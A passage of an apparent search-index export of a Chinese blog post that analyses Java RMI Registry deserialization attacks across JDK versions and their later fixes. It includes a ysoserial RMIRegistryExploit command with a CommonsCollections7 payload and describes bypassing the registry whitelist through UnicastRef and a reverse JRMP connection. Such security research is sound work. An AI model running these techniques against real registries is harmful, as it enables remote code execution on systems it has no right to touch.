\u8bf7\u6c42"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#bindrebind","text":"Registry \u5bf9\u4e8e bind / rebind \u7684 \u8bf7\u6c42 \uff0c \u4f1a \u53bb \u68c0\u67e5 \u8fd9\u4e2a \u8bf7\u6c42 \u662f\u5426 \u4e3a \u672c\u5730 \u8bf7\u6c42 \uff0c \u5bf9\u4e8e \u5916\u90e8 \u7684 \u8bf7\u6c42 \uff0c Registry \u4f1a \u62d2\u7edd \u8be5 \u8bf7\u6c42 \u3002   \u8fd9\u91cc \u601d\u8def \u662f \u6b63\u786e \u7684 \uff0c \u53ef\u4ee5 \u9632\u6b62 \u5916\u90e8 \u7684 \u6076\u610f \u7ed1\u5b9a \uff0c \u4f46\u662f \u4ed6 \u5728 \u5b9e\u73b0 \u4e0a \u5b58\u5728 \u95ee\u9898 \u3002   JDK   8u141 \u4e4b\u524d \uff0c \u9996\u5148 \u4f1a \u53bb \u63a5\u6536 \u4f20\u9001 \u8fc7\u6765 \u7684 \u5bf9\u8c61 \uff0c \u5e76 \u5c06 \u5176 \u8fdb\u884c   readObject   \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u5b9e\u9645 \u5224\u65ad \u662f\u5426 \u4e3a \u672c\u5730 \u8bf7\u6c42 \uff0c \u662f \u5728 put \u65b0 \u7684 \u7ed1\u5b9a \u5bf9\u8c61 \u4e4b\u524d \u8fdb\u884c \u7684 \u3002 \u8fd9 \u610f\u5473 \u610f\u5473\u7740 \u5728 checkAccess \u4e4b\u524d \u6211\u4eec \u5c31 \u53ef\u4ee5 \u5b8c\u6210 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \uff0c \u8be5 \u9650\u5236 \u5e76 \u6ca1\u6709 \u8d77\u5230 \u76f8\u5e94 \u7684 \u4f5c\u7528 \u3002   \u800c \u5728 JDK   8u141 \u7248\u672c \u4e4b\u540e \uff0c   sun / rmi / registry / RegistryImpl _ Skel . java # dispatch   \u8fd9\u91cc \u4f1a\u5148 \u53bb \u5224\u65ad \u662f\u5426 \u4e3a \u672c\u5730 \u7ed1\u5b9a \u8bf7\u6c42 \uff0c \u7136\u540e \u518d \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u6240\u4ee5 \u5982\u679c \u8981 \u4f7f\u7528 bind / rebind \u8bf7\u6c42 \u6765 \u8fdc\u7a0b \u653b\u51fb Registry \uff0c JDK \u7248\u672c \u5fc5\u987b \u5728 8u141 \u4e4b\u524d","title":"\u6ce8\u610f \uff1a bind / rebind \u8bf7\u6c42 \u7684 \u9650\u5236"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#registrylookup","text":"\u7531\u4e8e bind / rebind \u8bf7\u6c42 \u5728 141 \u540e\u7eed \u7248\u672c \u5b58\u5728 \u9650\u5236 \uff0c \u6240\u4ee5 \u4e3a\u4e86 \u653b\u51fb Registry \u6211\u4eec \u5fc5\u987b \u627e \u5176\u4ed6 \u7684 \u65b9\u6cd5 \u3002   \u5728 RMI \u91cc \u5ba2\u6237 \u5ba2\u6237\u7aef \u5411 Registry \u53d1\u8d77 lookup \u8bf7\u6c42 \u662f \u4e0d \u9650\u5236 \u8bf7\u6c42 \u6e90 \u7684 \uff0c \u90a3\u4e48 lookup \u662f\u5426 \u53ef\u4ee5 \u88ab \u6211\u4eec \u5229\u7528 \u5462 \uff1f   \u7b54\u6848 \u662f \u80af\u5b9a \u7684 \uff0c \u6765\u770b   sun . rmi . registry . RegistryImpl _ Skel # dispatch   \u5bf9\u4e8e lookup \u8bf7\u6c42 \u7684 \u5904\u7406   \u53ef\u4ee5 \u770b\u5230 \u5728 \u8fd9\u91cc \uff0c \u63a5\u6536 \u5230 lookup \u53d1\u9001 \u8fc7\u6765 \u7684 \u5185\u5bb9 \u65f6 \uff0c \u4e5f \u662f \u76f4\u63a5 \u5bf9 \u5176 \u8fdb\u884c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u64cd\u4f5c \u3002 \u4f46\u662f \u8fd9\u91cc \u5e76 \u6ca1\u6709 bind / rebind \u7684 \u8bf7\u6c42 \u6e90 \u9650\u5236 \uff0c \u6240\u4ee5 \u6211\u4eec \u53ef\u4ee5 \u76f4\u63a5 lookup \u53d1\u8d77 \u5bf9 141 \u7248\u672c \u4e4b\u540e \u7684 registry \u7684 \u653b\u51fb \u3002   \u6211\u4eec \u5728 \u6784\u9020 lookup \u51fd\u6570 \u8bf7\u6c42 \u65f6 \uff0c \u53ea \u9700 \u91cd\u65b0 \u5b9e\u73b0 \u4e00\u4e0b lookup \u51fd\u6570 \u7684 \u5b9e\u73b0 \u5c31 \u53ef\u4ee5 \u4e86 \uff08 \u8fd9\u91cc \u5c06 Naming . lookup \u548c RegistryImpl _ Stub . lookup \u8fdb\u884c \u4e86 \u5408\u5e76 \uff0c \u5e76 \u5c06 \u4f20\u9001 \u8fc7\u53bb \u7684 \u5185\u5bb9 \u6539\u6210 \u4e86 \u4efb\u610f \u7684 Object \u5bf9\u8c61 \uff09 \u3002","title":"\u60c5\u666f \u4e8c \uff1a Registry \u63a5\u6536 lookup \u8bf7\u6c42"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x02-registry-jdk8u121","text":"\u73af\u5883 \u4f7f\u7528 jdk8u111 \uff0c \u8be5 \u7248\u672c \u4e0b \u7684 RMI   Registry \u63a5\u6536 \u7684 remote   obj \u53ea\u8981 \u7ee7\u627f \u4e86 Remote \u7c7b \u5373\u53ef \uff08 \u539f\u7406 \u89c1   2   \uff09 \uff0c \u6ca1\u6709 \u5176\u4ed6 \u7684 \u9650\u5236 \u3002   ysoserial \u5de5\u5177 \u4e2d \u7684   ysoserial . exploit . RMIRegisterExploit   \u91c7\u7528 \u4e86 \u4ee3\u7406 Remote \u7c7b \u7684 \u65b9\u5f0f \u6765 \u89e3\u51b3 \u8fd9\u4e2a \u9650\u5236 \u3002   \u4f7f\u7528 \u5982\u4e0b \u547d\u4ee4 \u5373\u53ef   java   - cp   ysoserial - 0.0 . 6 - SNAPSHOT - all . jar   ysoserial . exploit . RMIRegistryExploit   RMIRegisterHost   RMIRegisterPort   CommonsCollections7   \" open   / System / Applications / Calculator . app \"","title":"0x02   \u653b\u51fb Registry   jdk & lt ; 8u121"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#ysoserialexploitrmiregisterexploit","text":"\u6839\u636e \u524d\u9762 \u6587\u7ae0 \u4e2d \u7684 \u539f\u7406 \uff0c \u6211\u4eec \u4f20 \u8fc7\u53bb \u7684 \u5bf9\u8c61 \u5fc5\u987b \u8981\u662f \u4e00\u4e2a \u7ee7\u627f \u4e86 java . rmi . Remote \u63a5\u53e3 \u7684 \u5bf9\u8c61 \u3002 \u8fd9\u91cc ysoserial \u5de5\u5177 \u5219 \u76f4\u63a5 \u5229\u7528 \u52a8\u6001 \u4ee3\u7406 \u7684 \u539f\u7406 \uff0c \u5bf9 Remote \u7c7b \u505a \u4ee3\u7406 \uff0c \u5176 \u5904\u7406 \u7684 handler \u7528 \u4e86 CommonsCollections \u4e2d \u5e38\u7528 \u7684 AnnotationInvocationHandler \u3002 \u4f46 \u5176 \u89e6\u53d1 \u70b9 \u53d8\u4e3a handler \u7684 memberValues \u5c5e\u6027 \u88ab \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6240 \u6267\u884c \u7684 \u5229\u7528 \u94fe \u3002   \u63a5\u4e0b \u4e0b\u6765 \u63a5\u4e0b\u6765 \uff0c \u8fdc\u7a0b bind \u5bf9\u8c61 \u5c06 \u6784\u9020 \u597d \u7684 remote \u5bf9\u8c61 \u4f20 \u8fc7\u53bb \u5373\u53ef \uff0c \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a \u4ee3\u7801","title":"\u7b80\u5355 \u770b \u4e00\u4e0b ysoserial . exploit . RMIRegisterExploit \u7684 \u539f\u7406"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x03-registry-jdk8u232_b09","text":"jdk8u121 \u4fee\u590d \u540e \u7684 \u7248\u672c \u91cc \uff0c \u5bf9 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u7c7b \u505a \u4e86 \u540d\u5355 \u767d\u540d\u5355 \u9650\u5236 \uff0c \u89c1   sun / rmi / registry / RegistryImpl . java # registryFilter   \u8fd9\u4e2a \u540d\u5355 \u767d\u540d\u5355 \u5305\u62ec \uff1a   if   (   String   .   class   = =   clazz   | |   java   .   lang   .   Number   .   class   .   isAssignableFrom   (   clazz   )   | |   Remote   .   class   .   isAssignableFrom   (   clazz   )   | |   java   .   lang   .   reflect   .   Proxy   .   class   .   isAssignableFrom   (   clazz   )   | |   UnicastRef   .   class   .   isAssignableFrom   (   clazz   )   | |   RMIClientSocketFactory   .   class   .   isAssignableFrom   (   clazz   )   | |   RMIServerSocketFactory   .   class   .   isAssignableFrom   (   clazz   )   | |   java   .   rmi   .   activation   .   ActivationID   .   class   .   isAssignableFrom   (   clazz   )   | |   java   .   rmi   .   server   .   UID   .   class   .   isAssignableFrom   (   clazz   ) )   {   return   ObjectInputFilter   .   Status   .   ALLOWED   ;   }   else   {   return   ObjectInputFilter   .   Status   .   REJECTED   ;   }   0x02 \u4e2d \u53d1\u9001 \u7684 \u5bf9\u8c61 \u662f \u4ee3\u7406 \u540e \u7684 AnnotationInvocationHandler \u5bf9\u8c61 \uff0c \u5e76 \u4e0d \u5728 \u4e0a\u8ff0 \u5141\u8bb8 \u7684 \u7c7b \u91cc\u9762 \uff0c \u8fd9 \u5bfc\u81f4 \u539f\u5148 ysoserial \u5de5\u5177 \u4e2d \u7684 ysoserial . exploit . RMIRegisterExploit \u65e0\u6cd5 \u5229\u7528 \u3002 \u8fd9\u91cc \u6211\u4eec \u53c2\u8003   3   \u7684 \u65b9\u6cd5 \u6765 \u8fbe\u6210 \u5229\u7528 \u3002   \u9996\u5148 \u601d\u8def \u6bd4\u8f83 \u660e\u786e \u7684 \u662f \uff0c \u5982\u679c \u8981 \u7ed5\u8fc7 \u8fd9\u4e2a \u9650\u5236 \uff0c \u6211\u4eec \u9700\u8981 \u5728 \u4e0a\u8ff0 \u7684 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u627e\u5230 \u53ef\u4ee5 \u5229\u7528 \u7684 \u5bf9\u8c61 \u3002   \u5728 \u540d\u5355 \u767d\u540d\u5355 \u91cc \u6211\u4eec \u6ce8\u610f \u4e00\u4e0b \u4e24\u4e2a \u7279\u6b8a \u5bf9\u8c61 Remote \u5bf9\u8c61 \u548c UnicastRef \u5bf9\u8c61","title":"0x03   \u653b\u51fb Registry   jdk & lt ; 8u232 _ b09"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#1-unicastref","text":"\u6211\u4eec \u90fd \u77e5\u9053 RMI \u8fc7\u7a0b \u4e2d \u5b58\u5728 \u5ba2\u6237 \u5ba2\u6237\u7aef \u4e0e \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u670d\u52a1\u5668\u7aef \u4e4b\u95f4 \u7684 \u4ea4\u4e92 \uff0c \u90a3\u4e48 \u5728 \u4ee3\u7801 \u5c42\u9762 \uff0c \u6211\u4eec \u9700\u8981 \u600e\u4e48 \u53bb \u521b\u9020 \u8fd9\u6837 \u4e00\u4e2a \u94fe\u63a5 \u5462 \uff1f   \u7531\u4e8e \u6f0f\u6d1e \u53d1\u751f \u70b9\u4e3a \u5411 \u8fdc\u7a0b \u670d\u52a1 \u52a1\u5668 \u670d\u52a1\u5668 \u6ce8\u518c \u5bf9\u8c61 \u7684 \u5f15\u7528 \u3002 \u56de\u987e \u4e00\u4e0b \uff0c \u6211\u4eec \u5728 bind \u65f6 \uff0c \u4f1a\u5148 \u53bb \u83b7\u5f97 \u4e00\u4e2a Registry \uff0c \u7c7b\u4f3c \u4e0b\u9762   Registry   registry   =   LocateRegistry   .   getRegistry   (   \" 192.168 . 98.80 \"   ) ;   \u8ddf\u8fdb   java / rmi / registry / LocateRegistry . java # getRegistry   \u6ce8\u610f \u5230 \u8fd9\u6837 \u4e00\u6bb5 \u4ee3\u7801 \uff0c \u901a\u8fc7 TCPEndpoint \u6ce8\u518c \u670d\u52a1 \u670d\u52a1\u7aef \u7684 host \u3001 \u7aef\u53e3 \u7b49 \u4fe1\u606f \uff0c \u4ee5 UnicastRef \u5c01\u88c5 liveRef . \u5728 \u4e0b\u9762 createProxy \u65f6 \u4f7f\u7528 \u4e86 RemoteObjectInvocationHandler \u4f5c\u4e3a UnicastRef \u52a8\u6001 \u4ee3\u7406 \u7684 \u5904\u7406 \u7c7b   \u6700\u7ec8 \uff0c \u6211\u4eec \u5c06 \u4ee5 \u5ba2\u6237 \u5ba2\u6237\u7aef \u7684 \u8eab\u4efd \u53bb \u94fe\u63a5 \uff0c \u6240\u4ee5 \u8fd9\u91cc \u7684 Registry \u4f1a \u662f   sun / rmi / registry / RegistryImpl _ Stub . java # bind   \u5411 \u8fdc\u7a0b RMI   Registry \u6ce8\u518c \u3002   newCall \u53d1\u8d77 \u8fde\u63a5 \uff0c \u5e76 \u5c06 \u9700\u8981 \u7ed1\u5b9a \u7684 \u5bf9\u8c61 \u53d1\u9001 \u8fc7\u53bb \u3002   \u5230 \u8fd9\u91cc \u5c31 \u7ed3\u675f \u4e86 \u5411 \u8fdc\u7a0b Registry \u53d1\u8d77 \u7ed1\u5b9a \u7684 \u64cd\u4f5c \u3002 \u8fd9\u4e2a \u8fc7\u7a0b \u4e2d \u6211\u4eec \u7528\u5230 \u4e86 UnicastRef \u5bf9\u8c61 \uff0c \u90a3\u4e48 \u8fd9\u91cc \u60f3\u8c61 \u4e00\u4e0b \uff0c \u5982\u679c \u6211\u4eec \u53ef\u4ee5 \u63a7\u5236 UnicastRef \u5bf9\u8c61 \u91cc LiveRef \u7684 host \u548c port \uff0c \u90a3\u4e48 \u6211\u4eec \u5c31 \u80fd \u53d1\u8d77 \u4efb\u610f \u7684 RMI \u8fde\u63a5 \u3002 \u8fd9\u91cc \u5c31\u662f ysoserial \u4e2d JRMPClient \u7684 \u539f\u7406 \uff0c \u6765\u770b \u4e00\u4e0b \u8fd9\u4e2a payload   \u4e0d\u662f \u662f\u4e0d\u662f \u5f88 \u719f\u6089 XD \uff0c \u4f7f\u7528 \u7684 \u65b9\u6cd5 \u5c31\u662f \u524d\u9762 \u7ed1\u5b9a \u8fc7\u7a0b \u4e2d \u7684 \u4ee3\u7801 \u3002 \u800c \u5728 \u540d\u5355 \u767d\u540d\u5355 \u91cc UnicastRef \u5bf9\u8c61 \u662f \u5141\u8bb8 \u88ab \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u3002","title":"1 .   UnicastRef \u5bf9\u8c61"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#2-remoteobjectinvocationhandler","text":"\u524d\u9762 \u5206\u6790 \u5230 UnicastRef \u53ef \u88ab \u7528\u4e8e \u53d1\u8d77 RMI \u8fde\u63a5 \uff0c \u4f46\u662f \u4e3a\u4e86 \u7b26\u5408 \u53d1\u9001 \u7684 \u6761\u4ef6 \uff0c \u4ecd\u7136 \u9700\u8981 \u6ee1\u8db3 \u5b9e\u73b0 Remote \u63a5\u53e3 \u7684 \u6761\u4ef6 \u3002 \u800c UnicastRef \u5e76 \u6ca1\u6709 \u5b9e\u73b0 Remote \u63a5\u53e3 \uff0c \u8fd9 \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u76f4\u63a5 \u4f20 UnicastRef \u662f \u4e0d\u884c \u7684 \uff0c \u6211\u4eec \u8fd8 \u9700\u8981 \u518d \u591a \u505a \u4e00\u6b65 \uff0c \u8fd9\u91cc \u6709 \u4e24\u79cd \u65b9\u6cd5 \uff1a   \u8ddf RMIRegisterExploit \u4e00\u6837 \uff0c \u4f7f\u7528 Proxy \u53cd\u5c04 \u6765 \u5b9e\u73b0 \uff0c \u5176 handler \u7ee7\u627f \u4e8e Remote \u5e76 \u5904\u7406 \u4e86 \u6784\u9020 \u597d \u7684 UnicastRef \uff0c \u8fd9\u91cc \u7528\u5230 \u7684 \u5c31\u662f RemoteObjectInvocationHandler   \u627e\u5230 \u4e00\u4e2a \u53ef\u4ee5 \u5c01\u88c5 UnicastRef \u7684 \u5bf9\u8c61 \uff0c \u5e76\u4e14 \u8be5 \u5bf9\u8c61 \u8fd8 \u5b9e\u73b0 \u4e86 Remote \u5bf9\u8c61   \u8fd9\u91cc JRMPClient \u4f7f\u7528 \u7684 RemoteObjectInvocationHandler \u5c31\u662f \u7b2c\u4e00 \u4e00\u79cd \u7b2c\u4e00\u79cd \u65b9\u6cd5 \uff0c \u6211\u4eec \u5c06 AnnotationInvocationHandler \u66ff\u6362 \u6362\u6210 \u66ff\u6362\u6210 RemoteObjectInvocationHandler \u3002 \u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u65f6\u4f1a \u8c03\u7528 RemoteObjectInvocationHandler \u7684 \u7236\u7c7b RemoteObject \u7684 readObject \u51fd\u6570   \u8fd9\u91cc \u7684 ref \u5c31\u662f \u6211\u4eec \u4f20 \u8fdb\u53bb \u7684 UnicastRef \uff0c \u8c03\u7528 \u5176 readExternal \u51fd\u6570 \uff0c \u8fd9\u91cc \u4ecb\u7ecd \u4e00\u4e0b readExternal   Java \u9ed8\u8ba4 \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u673a\u5236 \u975e\u5e38 \u7b80\u5355 \u975e\u5e38\u7b80\u5355 \uff0c \u800c\u4e14 \u5e8f\u5217 \u5e8f\u5217\u5316 \u540e \u7684 \u5bf9\u8c61 \u4e0d \u9700\u8981 \u518d\u6b21 \u8c03\u7528 \u6784\u9020 \u5668 \u91cd\u65b0 \u751f\u6210 \uff0c \u4f46\u662f \u5728 \u5b9e\u9645 \u4e2d \uff0c \u6211\u4eec \u53ef\u4ee5 \u4f1a \u5e0c\u671b \u5bf9\u8c61 \u7684 \u67d0 \u4e00\u90e8 \u90e8\u5206 \u4e00\u90e8\u5206 \u4e0d \u9700\u8981 \u88ab \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6216\u8005 \u6216\u8005\u8bf4 \u4e00\u4e2a \u5bf9\u8c61 \u88ab \u8fd8\u539f \u4e4b\u540e \uff0c \u5176 \u5185\u90e8 \u7684 \u67d0\u4e9b \u5b50 \u5bf9\u8c61 \u9700\u8981 \u91cd\u65b0 \u521b\u5efa \uff0c \u4ece\u800c \u4e0d\u5fc5 \u5c06 \u8be5\u5b50 \u5bf9\u8c61 \u5e8f\u5217 \u5e8f\u5217\u5316 \u3002   \u5728 \u8fd9\u4e9b \u60c5\u51b5 \u4e0b \uff0c \u6211\u4eec \u53ef\u4ee5 \u8003\u8651 \u5b9e\u73b0 Externalizable \u63a5\u53e3 \u4ece\u800c \u4ee3\u66ff Serializable \u63a5\u53e3 \u6765 \u5bf9 \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fc7\u7a0b \u8fdb\u884c \u63a7\u5236 \u3002   Externalizable \u63a5\u53e3 extends   Serializable \u63a5\u53e3 \uff0c \u800c\u4e14 \u5728 \u5176 \u57fa\u7840 \u4e0a \u589e\u52a0 \u4e86 \u4e24\u4e2a \u65b9\u6cd5 \uff1a writeExternal ( ) \u548c readExternal ( ) \u3002 \u8fd9 \u4e24\u4e2a \u65b9\u6cd5 \u4f1a \u5728 \u5e8f\u5217 \u5e8f\u5217\u5316 \u548c \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u8fd8\u539f \u7684 \u8fc7\u7a0b \u4e2d \u88ab \u81ea\u52a8 \u8c03\u7528 \uff0c \u4ee5\u4fbf \u6267\u884c \u4e00\u4e9b \u7279\u6b8a \u7684 \u64cd\u4f5c \u3002   https : / / xz . aliyun . com / t / 5392   \u8fd9\u91cc \u7684 readExternal \u5c31\u662f \u91cd\u65b0 \u521b\u5efa \u4e00\u4e2a tcp \u8fde\u63a5   \u7ee7\u7eed \u5f80\u4e0b \u8ddf   \u91cd\u65b0 \u751f\u6210 \u4e00\u4e2a LiveRef \u5bf9\u8c61 \u540e \uff0c \u5c06 \u5b58\u50a8 \u5230 \u5f53\u524d \u7684 ConnectionInputStream \u4e0a \u3002 \u540e\u7eed \u8be5 stream \u4f1a \u7ee7\u7eed \u8c03\u7528 registerRefs \u51fd\u6570   \u6700\u7ec8 \u7531 DGCClient \u53d1\u8d77 \u8fde\u63a5 \uff0c \u4e0b\u56fe \u4e2d \u7684 loopup \u51fd\u6570   \u5230 \u8fd9\u91cc \u540e\u9762 \u5c31\u662f JRMPListener \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u4e1c\u897f \u4e86 \uff0c \u8fd9\u91cc \u5728 \u6700\u540e \u8fdb\u884c \u5206\u6790 \u3002","title":"2 .   RemoteObjectInvocationHandler \u5bf9\u8c61"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#3-rmiconnectionimpl_stub","text":"\u524d\u9762 \u63d0\u5230 \u4e86 \u4e24\u79cd \u601d\u8def \uff0c \u8fd8\u6709 \u4e00\u79cd \u5c31\u662f \u627e\u5230 \u4e00\u4e2a \u5b9e\u73b0 \u4e86 Remote \u63a5\u53e3 \u5e76\u4e14 \u5c01\u88c5 \u4e86 ref \u7684 \u5bf9\u8c61 \uff0c \u8fd9\u91cc RMIConnectionImpl _ Stub \u5bf9\u8c61 \u5c31\u662f   RemoteObjectInvocationHandler \u540e\u7eed \u7684 \u89e6\u53d1 \u4e3b\u8981 \u4f9d\u9760 RemoteObject \u5bf9\u8c61 \u7684 readObject \u51fd\u6570 \u7684 \u91cd\u65b0 \u586b\u5145 \uff0c \u800c RMIConnectionImpl _ Stub \u5bf9\u8c61 \u4e5f \u7ee7\u627f \u4e86 RemoteObject \u6240\u4ee5 \u540e\u9762 \u7684 \u4e00\u4e9b \u8c03\u7528 \u8fc7\u7a0b \u8ddf \u7b2c\u4e8c \u4e8c\u4e2a \u7b2c\u4e8c\u4e2a \u5bf9\u8c61 \u4e00\u6837 \uff0c \u4e0d\u518d \u53d9\u8ff0 \u3002   \u5176\u5b9e \u987a\u7740 \u601d\u8def \u627e \u8fd8 \u80fd \u53d1\u73b0   DGCImpl _ Stub   \u3001   RMIServerImpl _ Stub   \u3001   RegistryImpl _ Stub   \u3001   ReferenceWrapper _ Stub   \u90fd \u53ef\u4ee5","title":"3 .   RMIConnectionImpl _ Stub \u5bf9\u8c61"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#20200616-trick","text":"\u524d\u9762 2 \u7684 \u90e8\u5206 \u63d0\u5230 \u4e86 \u7531\u4e8e UnicastRef \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u8fd8\u539f \u7684 \u5185\u5bb9 ref \u4f1a \u88ab \u6ce8\u518c \u5230 \u5f53\u524d \u7684 ConnectionInputStream \u7684 incomingRefTable \uff0c \u5e76\u4e8e StreamRemoteCall \u7684 releaseInputStream \u65f6 \u8c03\u7528 \u53d1\u8d77 \u53cd\u5411 jrmp \u94fe\u63a5 \u3002   \u8fd9\u91cc \u7684 \u91cd\u70b9 \u5728\u4e8e UnicastRef \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff0c \u6211\u4eec \u5728 3 \u7684 \u90e8\u5206 \u627e \u7684 \u90a3 \u51e0\u4e2a \u7c7b \u90fd \u56e0\u4e3a \u662f\u56e0\u4e3a \u5c01\u88c5 UnicastRef \uff0c \u5728 \u5b9e\u9645 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \u4e2d \uff0c \u8fd9 \u51e0\u4e2a \u7c7b \u7684 \u5c5e\u6027 \u88ab \u8c03\u7528 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u800c \u8fd8\u539f UnicastRef \u3002   \u5728 \u5e38\u89c1 \u7684 readObject \u51fd\u6570 \u7684 \u5904\u7406 \u4e2d \uff0c \u5176\u5b9e \u6709 \u4e00\u70b9 \u5f88 \u91cd\u8981 \uff0c \u4ed6 \u662f \u4e00\u4e2a \u9012\u5f52 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u7684 \u8fc7\u7a0b \uff0c \u5c31\u7b97 \u5f53\u524d \u7c7b \u4e0d \u5b58\u5728 \uff0c \u4f46\u662f \u8fd8\u662f \u4f1a \u53bb \u9012\u5f52 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5f53\u524d \u6570\u636e \u4e2d \u7684 \u7c7b \u5c5e\u6027 \u3002   \u6240\u4ee5 \u6211\u4eec \u4e5f \u53ef\u4ee5 \u4e0d\u7528 \u524d\u9762 \u627e\u5230 \u7684 \u51e0\u4e2a \u7c7b \uff0c \u81ea\u5df1 \u5199 \u4e00\u4e2a \u5c01\u88c5 UnicastRef \u4e5f \u80fd \u540c\u6837 \u8fbe\u5230 \u8fd9\u79cd \u6548\u679c \uff0c \u5177\u4f53 \u770b   RMIConnectWrapped","title":"20200616   \u66f4\u65b0 \u4e00\u4e2a \u5c0f trick"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x04-jdk8u232_b09","text":"jdk \u7248\u672c 8u232 _ b09 \u4fee\u590d \u4e86 \u524d\u9762 \u4f7f\u7528 \u53cd\u5411 \u53d1\u8d77 JRMP \u8fde\u63a5 \u7684 \u5229\u7528 \u3002 \u4fee\u590d \u70b9 \u5305\u62ec \u4e24\u4e2a","title":"0x04   \u540e\u7eed   jdk & gt ; = 8u232 _ b09"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#registryimpl_skel","text":"sun . rmi . registry . RegistryImpl _ Skel # dispatcher   \uff0c \u8fd9\u91cc \u622a \u4e86 lookup \u51fd\u6570 \u7684 \u5904\u7406 \uff0c bind / rebind \u51fd\u6570 \u7684 \u5904\u7406 \u662f \u4e00\u6837 \u7684   \u5f53 \u53d1\u751f \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u9519\u8bef \u6216\u8005 \u7c7b\u578b \u8f6c\u6362 \u7c7b\u578b\u8f6c\u6362 \u9519\u8bef \u65f6 \uff0c \u4f1a \u8c03\u7528   call . discardPendingRefs   \uff0c \u5c06 \u73b0\u6709 \u7684 JRMP \u8fde\u63a5 \u6e05\u9664 \u6389 \u3002 \u4e5f \u5c31 \u610f\u5473 \u610f\u5473\u7740 \u8fd9\u91cc \u6211\u4eec \u65e0\u6cd5 \u7528 JRMP \u53cd\u5411 \u94fe\u63a5 \u7684 \u65b9\u5f0f \u6765 \u8fbe\u6210 \u5229\u7528 \u4e86 \u3002","title":"\u4e00 \uff1a RegistryImpl _ Skel"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#dgcimpl_stub","text":"\u5f53 Registry \u5904\u7406 JRMP \u53cd\u8fde \u7684 \u65f6\u5019 \uff0c \u4f1a \u8c03\u7528   DGCImpl _ Stub # dirty   \uff0c \u800c   ref . invoke   \u4f1a \u6700\u7ec8 \u8c03\u7528   sun . rmi . transport . StreamRemoteCall # executeCall   \u6765 \u5904\u7406 \u8fd4\u56de \u7684 \u5f02\u5e38 \uff0c \u8fd9\u91cc \u4f1a \u6700\u7ec8 \u5bfc\u81f4 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 ( \u8be6\u7ec6 \u89c1 0x05 \u756a\u5916 )   \u800c \u5728 232 \u7248\u672c \uff0c \u5c06 \u539f\u672c \u5728 \u540e\u9762 \u6ce8\u518c \u7684   leaseFilter   \u63d0\u5230 \u4e86 \u524d\u9762   \u770b\u770b \u8be5 \u8fc7\u6ee4 \u6ee4\u5668 \u8fc7\u6ee4\u5668 \u7684 \u9650\u5236   sun / rmi / transport / DGCImpl _ Stub . java # leaseFilter   \u5bf9\u4e8e \u8fd4\u56de \u7684 \u5e8f\u5217 \u5e8f\u5217\u5316 \u5bf9\u8c61 \uff0c \u53ea \u5141\u8bb8 \u4e0a\u9762 \u7684 \u51e0\u79cd \u7c7b\u578b \uff0c \u800c \u73b0\u6709 \u7684 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u5229\u7528 \u94fe\u4e2d HashSet \u3001 HashTable \u7b49 \u7c7b \u90fd \u662f \u4e0d\u8fc7 \u901a\u4e0d\u8fc7 \u7684 \u3002   \u6240\u4ee5 \u5728 Registry \u53d1\u8d77 \u7684 \u53cd\u5411 \u8fde\u63a5 \u662f \u65e0\u6cd5 \u5229\u7528 \u6210\u529f \u7684 \u3002   ps : \u8fd9\u91cc \u7528 \u7684   DGCImpl _ Stub   \u662f \u5ba2\u6237 \u5ba2\u6237\u7aef \u53d1\u8d77 \u65f6 \u4f7f\u7528 \u7684 \uff0c \u76f8\u5bf9 \u5e94 \u7684 \u8fd8\u6709 server \u7aef \u63a5\u6536 Client \u53d1\u8d77 \u7684 \u8fde\u63a5 \u7684 \u5904\u7406   DGCImpl _ Skel   \uff0c skel \u8fd9\u91cc \u4e5f \u5b58\u5728 \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \u6f0f\u6d1e \uff0c \u5177\u4f53 \u89c1 0x08","title":"\u4e8c \uff1a DGCImpl _ Stub"},{"location":"blog/2020/rmi-registry-security-problem-20200206/#0x05-ysoserialjrmplistenerjrmpclient","text":"\u770b \u4e86 \u4e0a\u9762 \u53ef\u80fd \u4f60 \u4f1a \u7591\u60d1 \uff0c \u4ec0\u4e48 \u4e3a\u4ec0\u4e48 server \u7aef \u53d1\u8d77 \u4e00\u4e2a RMI \u7684 \u8fde\u63a5 \u5c31 \u4f1a \u89e6\u53d1 java \u53cd \u5e8f\u5217 \u5e8f\u5217\u5316 \uff1f   \u524d \u6587 \u6211\u4eec \u5c06 \u7684 \u662f RMI   Registry \u5728 